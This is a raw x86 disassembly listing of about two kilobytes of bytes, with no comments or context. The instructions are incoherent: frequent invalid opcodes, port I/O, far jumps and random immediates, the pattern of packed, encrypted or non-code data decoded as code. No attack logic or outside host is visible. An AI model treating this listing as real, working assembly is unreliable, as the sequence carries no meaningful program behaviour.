  435816:	sar    BYTE PTR [edx],cl
  435818:	lds    ebx,FWORD PTR [edx]
  43581a:	pop    ds
  43581b:	push   ebp
  43581c:	mov    eax,0x47804e96
  435821:	add    bl,BYTE PTR [ecx+ecx*4-0x4]
  435825:	mov    esp,0x56c36dd0
  43582a:	push   ds
  43582b:	or     eax,0xf1398380
  435830:	jb     0x4357f7
  435832:	adc    edi,edx
  435834:	outs   dx,DWORD PTR ds:[esi]
  435835:	mov    ebx,0xad22226
  43583a:	push   cs
  43583b:	jmp    0x3b49abf5
  435840:	or     DWORD PTR [esi+0x71023ebe],esi
  435846:	sub    eax,0xcc4ae3e8
  43584b:	pop    ebx
  43584c:	out    dx,al
  43584d:	or     BYTE PTR [eax+ebp*8+0x3a],0xc7
  435852:	add    dl,BYTE PTR [ecx-0x75]
  435855:	and    DWORD PTR [edi-0x73ac9baa],ecx
  43585b:	clc    
  43585c:	retf   
  43585d:	ret    
  43585e:	shl    BYTE PTR [eax],0x51
  435861:	add    esi,eax
  435863:	fcmovnb st,st(3)
  435865:	push   0xdd2abe15
  43586a:	pusha  
  43586b:	ror    DWORD PTR [edx+esi*4-0x17],0x1e
  435870:	push   edx
  435871:	popf   
  435872:	sub    ah,dl
  435874:	dec    ebp
  435875:	arpl   WORD PTR [ebp+0x3c6564b],bp
  43587b:	ret    0x6308
  43587e:	rcr    DWORD PTR [ebx-0x538226e0],cl
  435884:	scas   al,BYTE PTR es:[edi]
  435885:	ins    BYTE PTR es:[edi],dx
  435886:	adc    BYTE PTR [eax+esi*2],0x9c
  43588a:	push   esp
  43588b:	stos   BYTE PTR es:[edi],al
  43588c:	cmp    DWORD PTR ds:0xef882d5f,ecx
  435892:	lea    edi,[eax]
  435894:	fcmovnu st,st(0)
  435896:	jns    0x435906
  435898:	dec    esp
  435899:	add    al,ah
  43589b:	leave  
  43589c:	mov    ds:0x217b06b6,al
  4358a1:	enter  0x597d,0xb5
  4358a5:	cmc    
  4358a6:	jo     0x43583c
  4358a8:	(bad)  
  4358a9:	lock clc 
  4358ab:	jae    0x4358bd
  4358ad:	add    DWORD PTR [edx],edi
  4358af:	mov    dh,0x74
  4358b1:	fs dec esi
  4358b3:	addr16 cmp dh,dl
  4358b6:	loopne 0x435863
  4358b8:	ror    edi,1
  4358ba:	addr16 out dx,eax
  4358bc:	mov    BYTE PTR [ebx+0x6f6e3897],ah
  4358c2:	in     eax,dx
  4358c3:	aad    0x27
  4358c5:	or     al,0xa5
  4358c7:	daa    
  4358c8:	shr    DWORD PTR [edi-0x2e77b7c7],cl
  4358ce:	mov    DWORD PTR [edx],esp
  4358d0:	mov    eax,ds:0x88a7d836
  4358d5:	mov    BYTE PTR [eax],ah
  4358d7:	mov    ecx,0xdf1e43b3
  4358dc:	stos   BYTE PTR es:[edi],al
  4358dd:	push   0x61b8e39e
  4358e2:	inc    edi
  4358e3:	int    0x18
  4358e5:	jo     0x43588b
  4358e7:	stos   DWORD PTR es:[edi],eax
  4358e8:	mov    esi,cs
  4358ea:	jp     0x4358a3
  4358ec:	xchg   ebp,eax
  4358ed:	jo     0x43588e
  4358ef:	mov    dl,dl
  4358f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4358f2:	pop    ds
  4358f3:	pop    ebx
  4358f4:	out    0xab,al
  4358f6:	fiadd  DWORD PTR [edx-0x2a34cfa2]
  4358fc:	jo     0x435978
  4358fe:	mov    edx,0xbe4139fe
  435903:	dec    ecx
  435904:	repnz fwait
  435906:	push   ds
  435907:	aam    0xb4
  435909:	das    
  43590a:	sbb    ebx,edi
  43590c:	out    0x6c,al
  43590e:	(bad)  
  435910:	xor    eax,0xef32194
  435915:	ds fs adc ecx,esi
  435919:	fwait
  43591a:	clc    
  43591b:	aam    0x5e
  43591d:	cs ret 
  43591f:	and    BYTE PTR [eax+0xcd47b2b],dl
  435925:	mulps  xmm5,xmm0
  435928:	inc    esp
  435929:	in     al,0x21
  43592b:	or     BYTE PTR [eax-0x350550b],0x6f
  435932:	xor    al,dl
  435934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435935:	add    bh,BYTE PTR [edx-0x5144951b]
  43593b:	ins    BYTE PTR es:[edi],dx
  43593c:	inc    edi
  43593d:	jecxz  0x4359bd
  43593f:	push   ecx
  435940:	push   cs
  435941:	push   ds
  435942:	xor    dl,BYTE PTR [edi+0x1]
  435945:	shl    BYTE PTR [ebx-0x6f],1
  435948:	data16 icebp 
  43594a:	sbb    DWORD PTR [esi+ebp*2-0x5e603673],0x5
  435952:	mov    cx,0xa62e
  435956:	cmp    BYTE PTR [ebx+esi*4-0xd],0x70
  43595b:	xlat   BYTE PTR ds:[ebx]
  43595c:	mov    DWORD PTR [eax],edx
  43595e:	mov    ecx,0x65e6be3c
  435963:	aam    0x43
  435965:	fdivrp st(2),st
  435967:	ret    0x1bc4
  43596a:	test   DWORD PTR ds:0x8e64f988,ebp
  435970:	fwait
  435971:	xor    DWORD PTR [ecx+0x39],eax
  435974:	or     BYTE PTR [eax-0x7276ba21],0xe8
  43597b:	mov    ebp,0xb743a3f7
  435980:	mov    dl,0x3d
  435982:	fisubr WORD PTR [eax]
  435984:	or     BYTE PTR [edi+0x60],dh
  435987:	add    BYTE PTR [esi+0x7aabc604],ch
  43598d:	mov    ds:0x82f66ddf,eax
  435992:	jecxz  0x43592c
  435994:	sahf   
  435995:	inc    ebx
  435996:	mul    DWORD PTR [ebx-0x3f]
  435999:	add    cl,BYTE PTR [edx-0x55549b2]
  43599f:	add    ch,BYTE PTR [edi+0x2]
  4359a2:	add    bl,dh
  4359a4:	loop   0x4359fe
  4359a6:	mov    ecx,0x1e177611
  4359ab:	int    0xad
  4359ad:	inc    ebx
  4359ae:	lahf   
  4359af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359b0:	push   ss
  4359b1:	cmp    DWORD PTR [edi],ecx
  4359b3:	xlat   BYTE PTR ds:[ebx]
  4359b4:	pusha  
  4359b5:	jmp    0x9859:0x291404fa
  4359bc:	inc    ecx
  4359bd:	cdq    
  4359be:	xchg   esi,eax
  4359bf:	addr16 dec edi
  4359c1:	add    edx,DWORD PTR [ebx]
  4359c3:	nop
  4359c4:	xchg   DWORD PTR [ecx+0x58e8dd5],esp
  4359ca:	inc    eax
  4359cb:	ja     0x435a46
  4359cd:	repz mov edi,0x1e5a56c7
  4359d3:	and    DWORD PTR [eax],ebx
  4359d5:	sbb    eax,0x93975661
  4359da:	and    BYTE PTR [eax+edx*2+0x34],ch
  4359de:	mov    esi,0x7b68a9d5
  4359e3:	outs   dx,DWORD PTR ds:[esi]
  4359e4:	fisub  DWORD PTR [eax+eiz*2-0xd66a127]
  4359eb:	inc    esi
  4359ed:	cmp    BYTE PTR [ebx+0x63b248b8],bl
  4359f3:	outs   dx,DWORD PTR ds:[esi]
  4359f4:	or     DWORD PTR [ecx-0x6f905469],esi
  4359fa:	push   eax
  4359fb:	inc    esi
  4359fc:	mov    BYTE PTR [ebx+0x4f],al
  4359ff:	repz mov esi,0x87d6fc2d
  435a05:	add    esi,DWORD PTR [edx-0x47540b49]
  435a0b:	adc    BYTE PTR ds:0x880bd682,cl
  435a11:	lea    esi,[ecx-0x5d]
  435a14:	(bad)  
  435a15:	ds arpl bx,di
  435a18:	sbb    dl,bl
  435a1a:	es clc 
  435a1c:	pop    es
  435a1d:	inc    esp
  435a1e:	pusha  
  435a1f:	mov    esi,0xe2e0288
  435a24:	jmp    0x435a21
  435a26:	repz inc ebp
  435a28:	mov    DWORD PTR [ebx+0x33c965f0],eax
  435a2e:	sahf   
  435a2f:	loope  0x435a57
  435a31:	add    ebx,DWORD PTR [edx+esi*8]
  435a34:	or     cl,ah
  435a36:	cli    
  435a37:	fst    DWORD PTR [eax-0x79]
  435a3a:	mov    ?,WORD PTR [edi-0x4f]
  435a3d:	ds sub DWORD PTR ds:[esi-0x542a14a8],eax
  435a45:	int3   
  435a46:	push   0xffffffe0
  435a48:	(bad)  
  435a49:	rcr    BYTE PTR [edx],1
  435a4b:	mov    edx,0xd485e7fd
  435a50:	pop    esi
  435a51:	inc    ecx
  435a52:	push   ebx
  435a53:	or     eax,0xa3ff94e6
  435a58:	shl    DWORD PTR [ebx+0x1c],cl
  435a5b:	pop    eax
  435a5c:	mov    DWORD PTR [ebx-0x4a],ecx
  435a5f:	add    ch,BYTE PTR [esi-0x5b]
  435a62:	outs   dx,WORD PTR ds:[esi]
  435a64:	inc    esi
  435a65:	mov    dh,0x32
  435a67:	cmp    edx,DWORD PTR [eax-0x51887ebe]
  435a6d:	sbb    cl,dh
  435a6f:	xchg   esp,eax
  435a70:	mov    WORD PTR [edx+0x6b89c3c4],gs
  435a76:	adc    eax,0x2cdb68e1
  435a7b:	xlat   BYTE PTR ds:[ebx]
  435a7c:	dec    esi
  435a7d:	mov    al,ds:0x2b3c9b76
  435a82:	mov    BYTE PTR [esi-0x24c4eaa8],al
  435a88:	mov    cl,ah
  435a8a:	xor    DWORD PTR [ecx-0x50],0x3b
  435a8e:	xchg   esi,eax
  435a8f:	sub    BYTE PTR [edx+0xd63ea05],0xcc
  435a96:	jl     0x435afc
  435a98:	mov    DWORD PTR [edx+0x1e],ebp
  435a9b:	adc    DWORD PTR [esi-0x5f0718cf],edx
  435aa1:	shl    BYTE PTR [esi-0x46],0x23
  435aa5:	pop    esi
  435aa6:	dec    eax
  435aa7:	or     eax,0x4b
  435aaa:	pop    ecx
  435aab:	call   DWORD PTR [ecx+0x426d72af]
  435ab1:	jl     0x435a43
  435ab3:	aad    0xcf
  435ab5:	mov    dh,0x1a
  435ab7:	call   0xf70f:0xe70a0374
  435abe:	xor    eax,0x1e6e943a
  435ac3:	add    ecx,esp
  435ac5:	popf   
  435ac6:	push   eax
  435ac7:	mov    ch,0x5a
  435ac9:	xchg   esp,eax
  435aca:	fld    TBYTE PTR [edi-0x1879f492]
  435ad0:	pushf  
  435ad1:	test   DWORD PTR [ecx+edi*1],esp
  435ad4:	push   0xb01d1f73
  435ad9:	mov    bh,0x3f
  435adb:	into   
  435adc:	test   eax,0x59c34bf9
  435ae1:	add    eax,edx
  435ae3:	inc    esp
  435ae4:	test   ah,0x5a
  435ae7:	fcmovne st,st(4)
  435ae9:	arpl   WORD PTR [edi+0x73],dx
  435aec:	jns    0x435b1d
  435aee:	std    
  435aef:	iret   
  435af0:	push   edx
  435af1:	inc    ebx
  435af2:	stos   BYTE PTR es:[edi],al
  435af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435af4:	retf   0xd83
  435af7:	aam    0xe3
  435af9:	(bad)  
  435afb:	leave  
  435afc:	bound  ecx,QWORD PTR [edi]
  435afe:	mov    DWORD PTR ds:0xad7d987a,esi
  435b04:	add    DWORD PTR [esi-0x48],edi
  435b07:	shr    DWORD PTR [edi],1
  435b09:	and    bh,BYTE PTR [ebx-0x72d98fab]
  435b0f:	aam    0xeb
  435b11:	jo     0x435b8a
  435b13:	pushf  
  435b14:	push   ecx
  435b15:	jp     0x435b5e
  435b17:	les    esi,FWORD PTR [ebx+edi*1+0x7c8a03f4]
  435b1e:	outs   dx,DWORD PTR ds:[esi]
  435b1f:	push   ebp
  435b20:	jmp    0x1c72:0xd8983fe3
  435b27:	sub    DWORD PTR [eax-0x554707e8],ecx
  435b2d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  435b2f:	test   BYTE PTR [ecx+0x550c0b3b],cl
  435b35:	pop    esi
  435b36:	(bad)  
  435b37:	jmp    0x9f81:0x3d2a14f5
  435b3e:	adc    dl,BYTE PTR [edi+0x75]
  435b41:	lods   al,BYTE PTR ds:[esi]
  435b42:	xchg   esp,eax
  435b43:	mov    ch,0x89
  435b45:	popa   
  435b46:	nop
  435b47:	or     bl,BYTE PTR [ecx+edx*1]
  435b4a:	inc    ebx
  435b4b:	popa   
  435b4c:	sahf   
  435b4d:	add    eax,0x8c725700
  435b52:	jp     0x435b45
  435b54:	hlt    
  435b55:	daa    
  435b56:	(bad)  
  435b57:	nop
  435b58:	mov    BYTE PTR [edi],cl
  435b5a:	arpl   WORD PTR [edi+0x5e07af0b],bp
  435b60:	daa    
  435b61:	sbb    eax,0x6acb86b4
  435b66:	cld    
  435b67:	das    
  435b68:	mov    al,BYTE PTR [esi+0x75]
  435b6b:	in     al,dx
  435b6c:	shl    esp,0x60
  435b6f:	loope  0x435afd
  435b71:	xor    eax,0x9fd43cf5
  435b76:	xlat   BYTE PTR ds:[ebx]
  435b78:	stos   DWORD PTR es:[edi],eax
  435b79:	gs imul esi,edi,0xcad500ff
  435b80:	mov    DWORD PTR [ebx],ecx
  435b82:	jp     0x435bb0
  435b84:	dec    edi
  435b85:	ret    0x11c6
  435b88:	dec    ebp
  435b89:	add    eax,DWORD PTR [esi-0x26714a4e]
  435b8f:	push   es
  435b90:	nop
  435b91:	cdq    
  435b92:	sahf   
  435b93:	jg     0x435b70
  435b95:	inc    esp
  435b96:	jb     0x3aa3dcd0
  435b9c:	pop    esi
  435b9d:	in     al,0x1
  435b9f:	dec    esp
  435ba0:	das    
  435ba1:	add    bl,BYTE PTR [esi+0xeaafa3e]
  435ba7:	pop    esi
  435ba8:	imul   esp,DWORD PTR [eax+0x1e],0xaf5b19bd
  435baf:	fidivr WORD PTR [edx+esi*1-0x47f728c1]
  435bb6:	xchg   BYTE PTR [ebp+0x46840448],dh
  435bbc:	lods   al,BYTE PTR ds:[esi]
  435bbd:	xor    esi,ebp
  435bbf:	dec    edx
  435bc0:	mov    DWORD PTR [edi+0x6f],esp
  435bc3:	cmp    eax,0xd4a7a73e
  435bc8:	iret   
  435bc9:	jge    0x435b86
  435bcb:	pop    ebx
  435bcc:	jo     0x435b99
  435bce:	ror    dl,0x89
  435bd1:	xor    DWORD PTR [eax],eax
  435bd3:	push   cs
  435bd4:	repz xchg ebp,eax
  435bd6:	sub    al,0x94
  435bd8:	add    DWORD PTR [edx],eax
  435bda:	sbb    dh,ah
  435bdc:	xor    al,0xcc
  435bde:	mov    al,0x57
  435be0:	nop
  435be1:	sub    al,0x94
  435be3:	jns    0x435b71
  435be5:	das    
  435be6:	sub    ebp,DWORD PTR [ecx]
  435be8:	inc    esi
  435be9:	add    dh,BYTE PTR [edx-0x76b933c9]
  435bef:	mov    ebx,0xcc04f28f
  435bf4:	or     dh,BYTE PTR [eax-0x4d5dc145]
  435bfa:	pushf  
  435bfb:	or     DWORD PTR [ebx+0x27c1dc7d],0x40f9d39d
  435c05:	dec    edi
  435c06:	dec    ecx
  435c07:	cdq    
  435c08:	push   ss
  435c09:	lahf   
  435c0a:	adc    ch,0x4a
  435c0d:	push   0x5fb7901b
  435c12:	fs dec ecx
  435c14:	jg     0x435bba
  435c16:	push   DWORD PTR [ebx-0x971ca6]
  435c1c:	stos   BYTE PTR es:[edi],al
  435c1d:	add    eax,0xe41a7dec
  435c22:	fbld   TBYTE PTR [ebp+0x32]
  435c25:	add    BYTE PTR [eax+0x3502d41f],bl
  435c2b:	int3   
  435c2c:	lahf   
  435c2d:	mov    cl,0x3a
  435c2f:	mov    ds:0x70161578,al
  435c34:	mov    dh,0x7c
  435c36:	xchg   esp,eax
  435c37:	aad    0x38
  435c39:	mov    al,ds:0x5189e309
  435c3e:	adc    al,0x6f
  435c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c42:	(bad)  
  435c43:	popfw  
  435c45:	add    eax,0xe04391e6
  435c4a:	sub    BYTE PTR [ebx],dl
  435c4c:	loopne 0x435be3
  435c4e:	sar    BYTE PTR ds:0xeb1f368b,0x62
  435c55:	xchg   ebp,eax
  435c56:	(bad)
  435c5a:	sbb    eax,0x681e63d4
  435c5f:	rol    BYTE PTR [ecx-0x7132a333],1
  435c65:	gs mov ebp,0x84c5cabb
  435c6b:	fs push cs
  435c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c6e:	or     BYTE PTR [ebp+0x37fa34da],ch
  435c74:	nop
  435c75:	cmp    eax,0xd983f94b
  435c7a:	popa   
  435c7b:	ret    
  435c7c:	call   0xc197:0x2028218e
  435c83:	fstp   DWORD PTR [ebx]
  435c85:	add    esp,DWORD PTR [edx]
  435c87:	int    0xf7
  435c89:	test   DWORD PTR [ecx+0x1e3ed9ec],edx
  435c8f:	jge    0x435c51
  435c91:	jne    0x435c63
  435c93:	add    BYTE PTR [edx+0x3d4cacf],ah
  435c99:	lock and BYTE PTR [esi+eiz*4],cl
  435c9d:	jbe    0x435cb5
  435c9f:	adc    DWORD PTR [ecx+0x64ad153d],ecx
  435ca5:	add    BYTE PTR [edi+edi*8],al
  435ca8:	fiadd  WORD PTR [eax]
  435caa:	je     0x435cff
  435cac:	das    
  435cad:	and    edx,edx
  435caf:	mov    edx,0xc022d2d4
  435cb4:	mov    es,WORD PTR [ecx-0xd]
  435cb7:	cdq    
  435cb8:	cmp    BYTE PTR [esi-0x80],cl
  435cbb:	lahf   
  435cbc:	enter  0x13c8,0x54
  435cc0:	pop    ss
  435cc1:	mov    bh,0x23
  435cc3:	mov    ah,BYTE PTR [ebx+eax*8+0x243bc31f]
  435cca:	jmp    0xc0d5:0xfb23ea28
  435cd1:	and    DWORD PTR [esi],ebp
  435cd3:	adc    edi,DWORD PTR [edx]
  435cd5:	lea    ebx,[ebx+ebx*4-0x6dbc0472]
  435cdc:	xchg   DWORD PTR [esi],eax
  435cde:	xchg   edi,eax
  435cdf:	xchg   ebp,eax
  435ce0:	je     0x435d5d
  435ce2:	ss aam 0x53
  435ce5:	add    eax,0xcdc59c91
  435cea:	or     dl,BYTE PTR [edx]
  435cec:	mov    cl,bl
  435cee:	inc    edi
  435cef:	cld    
  435cf0:	nop
  435cf1:	dec    ebp
  435cf2:	push   eax
  435cf3:	and    al,0xbf
  435cf5:	add    eax,0x553c47d8
  435cfa:	pop    eax
  435cfb:	jmp    0x1fa40354
  435d00:	loop   0x435c86
  435d02:	loopne 0x435cd2
  435d04:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  435d06:	adc    bl,BYTE PTR [edi+ebx*4-0x472b95c9]
  435d0d:	mov    ebx,0x2c428c1
  435d12:	pop    ds
  435d13:	xchg   DWORD PTR [edi+0x6c4c25ba],edi
  435d19:	mov    bh,0xa1
  435d1b:	aad    0xe0
  435d1d:	lods   al,BYTE PTR ds:[esi]
  435d1e:	xchg   ebp,eax
  435d1f:	push   0x39
  435d21:	call   0x6990:0x3888d27
  435d28:	daa    
  435d29:	rcr    DWORD PTR [ebx+0x2c028e02],1
  435d2f:	enter  0xc7da,0x5e
  435d33:	push   esp
  435d34:	ret    0x60dc
  435d37:	ja     0x435d5c
  435d39:	clc    
  435d3a:	cmp    al,0x73
  435d3c:	push   cs
  435d3d:	(bad)  
  435d3e:	sub    bh,bh
  435d40:	lea    ebx,[edi]
  435d42:	push   esp
  435d43:	jbe    0x435da0
  435d45:	sbb    bh,bh
  435d47:	stc    
  435d48:	pop    eax
  435d49:	dec    ebx
  435d4a:	(bad)  
  435d4b:	cwde   
  435d4c:	xchg   ebp,eax
  435d4d:	xor    esp,DWORD PTR [esi+0x13]
  435d50:	out    0x2,eax
  435d52:	outs   dx,DWORD PTR ds:[esi]
  435d53:	sbb    ah,ah
  435d55:	lods   eax,DWORD PTR ds:[esi]
  435d56:	mov    al,ds:0xbe5446b3
  435d5b:	pop    eax
  435d5c:	mov    BYTE PTR [ebx-0x7302303d],ch
  435d62:	in     al,0xcb
  435d64:	frstor [edx+ebp*1]
  435d67:	outs   dx,BYTE PTR ds:[esi]
  435d68:	ins    DWORD PTR es:[edi],dx
  435d69:	add    eax,0xa8c8f7bb
  435d6e:	jl     0x435da0
  435d70:	cmc    
  435d71:	lods   al,BYTE PTR ds:[esi]
  435d72:	dec    ebx
  435d73:	mov    eax,ds:0x791fa3d3
  435d78:	jae    0x435dd5
  435d7a:	mov    al,0x14
  435d7c:	hlt    
  435d7d:	add    eax,0x575a1756
  435d82:	or     cl,BYTE PTR [ebp+0x26]
  435d85:	dec    ebp
  435d86:	sar    DWORD PTR fs:0xeaf29576,cl
  435d8d:	xchg   ebp,eax
  435d8e:	mov    al,0xcb
  435d90:	add    dh,BYTE PTR gs:[esi+0x37]
  435d94:	add    ch,BYTE PTR [eax]
  435d96:	lods   eax,DWORD PTR ds:[esi]
  435d97:	sbb    edi,DWORD PTR [ebp+ebx*8-0x280dd8a2]
  435d9e:	pop    ecx
  435d9f:	pop    ebx
  435da0:	or     dl,BYTE PTR [eax+0x6e]
  435da3:	shl    esp,cl
  435da5:	and    eax,0x355f52f
  435daa:	push   edx
  435dab:	cmc    
  435dac:	or     al,0x3f
  435dae:	aaa    
  435daf:	pop    eax
  435db0:	push   esi
  435db1:	or     al,0x60
  435db3:	push   edi
  435db4:	xor    edx,esi
  435db6:	hlt    
  435db7:	xchg   edi,eax
  435db8:	xchg   BYTE PTR [edi-0x7b222b39],ch
  435dbe:	push   eax
  435dbf:	pop    ecx
  435dc0:	push   cs
  435dc1:	xchg   edi,eax
  435dc2:	cmp    al,0xf9
  435dc4:	mov    BYTE PTR [edi+0x37723657],dh
  435dca:	xchg   DWORD PTR [edx-0x43],esp
  435dcd:	repnz pop esp
  435dcf:	sbb    DWORD PTR [edx],ecx
  435dd1:	imul   eax,DWORD PTR [ecx],0xffffff99
  435dd4:	bound  esp,QWORD PTR [edi]
  435dd6:	loopne 0x435e3e
  435dd8:	cdq    
  435dd9:	dec    ebx
  435dda:	lods   eax,DWORD PTR ds:[esi]
  435ddb:	mov    esp,0xbac45e68
  435de0:	aad    0xab
  435de2:	and    eax,0x17604997
  435de7:	and    edi,DWORD PTR [ebx]
  435de9:	mov    esp,0x4201365
  435dee:	and    eax,DWORD PTR [ebp+0x31]
  435df1:	sub    DWORD PTR [esi+0x29],0xffffffff
  435df5:	sub    DWORD PTR [edx-0x1e7a67d4],edi
  435dfb:	pusha  
  435dfc:	ins    BYTE PTR es:[edi],dx
  435dfd:	xor    DWORD PTR [edx],ebx
  435dff:	test   DWORD PTR [ecx+0x47],0x94492f1e
  435e06:	sub    dl,bl
  435e08:	retf   0x1133
  435e0b:	xlat   BYTE PTR ds:[ebx]
  435e0c:	aam    0x97
  435e0e:	mov    bl,0x84
  435e10:	call   0x8bd74993
  435e15:	cdq    
  435e16:	jle    0x435dc3
  435e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e19:	cmc    
  435e1a:	daa    
  435e1b:	or     al,0x59
  435e1d:	add    eax,0xb0d447ae
  435e22:	pusha  
  435e23:	fdivr  st,st(0)
  435e25:	push   0xffffff9c
  435e27:	cs sub edi,ebx
  435e2a:	sub    esi,DWORD PTR [ecx-0x77]
  435e2d:	or     eax,0xa4e9ad50
  435e32:	std    
  435e33:	adc    BYTE PTR [eax],0x3
  435e36:	mov    bl,dh
  435e38:	dec    esi
  435e39:	aaa    
  435e3a:	mov    BYTE PTR [edi-0x2e4a086],bh
  435e40:	mov    DWORD PTR [ebx+0x5529c7d6],ecx
  435e46:	and    eax,0xaa2662e6
  435e4b:	xor    dl,BYTE PTR [edi+0x714e144]
  435e51:	dec    esi
  435e52:	pusha  
  435e53:	push   esp
  435e54:	imul   edi,DWORD PTR [ebx-0x466b537e],0x82ffff90
  435e5e:	adc    al,0x62
  435e60:	jo     0x435e59
  435e62:	(bad)  
  435e63:	aam    0xf9
  435e65:	(bad)  
  435e66:	clc    
  435e67:	inc    edi
  435e68:	push   0x56
  435e6a:	lods   eax,DWORD PTR ds:[esi]
  435e6b:	mov    WORD PTR [ecx-0x7d7331ad],cs
  435e71:	mov    esi,DWORD PTR [ebx-0x30]
  435e74:	jl     0x435e6d
  435e76:	mov    ds:0x782614dd,al
  435e7b:	sub    DWORD PTR [ebx],esp
  435e7d:	adc    BYTE PTR [edi-0x21],bl
  435e80:	or     DWORD PTR [ecx+0x538921f8],esi
  435e86:	mul    DWORD PTR [ebx+ecx*8-0x6b]
  435e8a:	xor    al,0x83
  435e8c:	jb     0x435e91
  435e8e:	into   
  435e8f:	adc    eax,0x6699e9f
  435e94:	out    dx,al
  435e95:	sbb    bl,BYTE PTR [edi]
  435e97:	push   ebp
  435e98:	or     eax,edi
  435e9a:	pop    ss
  435e9b:	jmp    0xd170d0d6
  435ea0:	(bad)  
  435ea2:	sub    al,0x2a
  435ea4:	sahf   
  435ea5:	xchg   esp,eax
  435ea6:	or     BYTE PTR [eax+ebp*2-0x3b90e012],dl
  435ead:	or     ch,BYTE PTR [ebx]
  435eaf:	inc    ebx
  435eb0:	lock cld 
  435eb2:	paddq  mm6,QWORD PTR [eax+0x73f57be4]
  435eb9:	mov    dl,0xb1
  435ebb:	imul   ecx,DWORD PTR [ebx-0x27856a81],0x40ac6990
  435ec5:	pop    es
  435ec6:	adc    ecx,DWORD PTR [edi-0x496ea265]
  435ecc:	mov    eax,0x8ea0f283
  435ed1:	jb     0x435f50
  435ed3:	(bad)  
  435ed4:	pop    ss
  435ed5:	loopne 0x435f2f
  435ed7:	xchg   esp,eax
  435ed8:	inc    ebx
  435ed9:	pop    ebx
  435eda:	shl    eax,0x55
  435edd:	add    cl,al
  435edf:	in     eax,dx
  435ee0:	push   ecx
  435ee1:	shl    DWORD PTR [esp+esi*4-0xce01e52],0x53
  435ee9:	iret   
  435eea:	xchg   edx,eax
  435eeb:	jmp    0xd63dc96c
  435ef0:	mov    edx,0xa59a10e9
  435ef5:	xor    eax,0x1389ae25
  435efa:	mov    bl,BYTE PTR [eax+0x23]
  435efd:	sub    ebx,DWORD PTR [edi+ebx*4]
  435f00:	dec    ebx
  435f01:	and    eax,0x4179461a
  435f06:	pusha  
  435f07:	fwait
  435f08:	push   edx
  435f09:	sub    al,0xd0
  435f0b:	fsub   st(5),st
  435f0d:	retf   
  435f0e:	pop    ds
  435f0f:	xchg   edi,eax
  435f10:	add    al,0xc5
  435f12:	div    BYTE PTR [ecx-0x26]
  435f15:	(bad)  
  435f17:	aam    0xea
  435f19:	pop    ds
  435f1a:	mov    ebx,0x8ae5a8c1
  435f1f:	loop   0x435ea9
  435f21:	mov    edi,0x9dba3fee
  435f26:	or     al,0x4b
  435f28:	inc    edx
  435f29:	mov    BYTE PTR [ebp+0x1202712b],dh
  435f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435f30:	lock inc edi
  435f32:	dec    ebp
  435f33:	retf   0xd81f
  435f36:	bound  eax,QWORD PTR [ecx-0x69e042cd]
  435f3c:	or     eax,0x5b40ff9f
  435f41:	add    dl,dl
  435f43:	pslld  mm1,QWORD PTR [edx-0x6b]
  435f47:	dec    edx
  435f48:	push   esp
  435f49:	mov    ds:0x2b48811f,eax
  435f4e:	test   dl,ch
  435f50:	cld    
  435f51:	jb     0x435f62
  435f53:	xlat   BYTE PTR ds:[ebx]
  435f54:	and    edi,ebp
  435f56:	pop    esi
  435f57:	imul   esp,DWORD PTR [ecx],0x31
  435f5a:	int3   
  435f5b:	test   DWORD PTR [ecx+0x1879d1d3],ecx
  435f61:	mov    eax,ds:0x34ecdf5
  435f66:	jp     0x435f31
  435f68:	sar    BYTE PTR [ebx-0x404b1a25],1
  435f6e:	pusha  
  435f6f:	daa    
  435f70:	or     dl,ah
  435f72:	inc    edx
  435f73:	inc    eax
  435f74:	jo     0x435fd8
  435f76:	out    0xd5,al
  435f78:	dec    ebx
  435f79:	dec    eax
  435f7a:	sub    BYTE PTR [edx+0x2d394971],ch
  435f80:	sahf   
  435f81:	and    ebp,DWORD PTR [esi]
  435f83:	jo     0x435f5f
  435f85:	add    ch,BYTE PTR [esi]
  435f87:	aad    0xd8
  435f89:	je     0x435f51
  435f8b:	(bad)  
  435f8c:	jle    0x435f4a
  435f8e:	dec    edi
  435f8f:	xchg   esp,eax
  435f90:	cmp    al,0xc7
  435f92:	inc    ebx
  435f93:	cmp    eax,0xdd95bbea
  435f98:	test   al,0x5
  435f9a:	xor    dh,BYTE PTR [eax+0x37]
  435f9d:	je     0x435fb4
  435f9f:	inc    esp
  435fa0:	inc    esi
  435fa1:	or     DWORD PTR [ebx],edi
  435fa3:	xlat   BYTE PTR ds:[ebx]
  435fa4:	cli    
  435fa5:	inc    ebx
  435fa6:	clc    
  435fa7:	and    BYTE PTR ds:0x88d7226b,al
  435fad:	stos   DWORD PTR es:[edi],eax
  435fae:	xor    DWORD PTR [esp+ecx*2+0x48],eax
  435fb2:	sbb    al,0xae
  435fb4:	sbb    bl,dl
  435fb6:	jl     0x435f80
  435fb8:	dec    ebx
  435fb9:	sbb    al,dh
  435fbb:	xchg   DWORD PTR [eax+0x35],ebx
  435fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fbf:	push   esi
  435fc0:	xchg   BYTE PTR [edx],dl
  435fc2:	stc    
  435fc3:	fdiv   QWORD PTR [edi-0x77d9bffc]
  435fc9:	fwait
  435fca:	rcr    DWORD PTR [eax],cl
  435fcc:	jecxz  0x436015
  435fce:	retf   0xe351
  435fd1:	add    dl,BYTE PTR [edx+eiz*8-0x9]
  435fd5:	sub    al,BYTE PTR [ebp-0x75]
  435fd8:	jg     0x435f68
  435fda:	popa   
  435fdb:	sub    esp,DWORD PTR gs:[edi-0x669db1fd]
  435fe2:	(bad)  
  435fe3:	or     ch,BYTE PTR [edx+eax*1]
  435fe6:	pop    edx
  435fe7:	add    DWORD PTR [eax+ebp*4+0x49],ecx
  435feb:	jns    0x43601b
  435fed:	inc    esi
  435fee:	pop    ds
  435fef:	inc    ecx
  435ff0:	xchg   edi,eax
  435ff1:	xor    eax,0xa5521659
  435ff6:	jb     0x435fcc
  435ff8:	jmp    0x392a853b
  435ffd:	push   edi
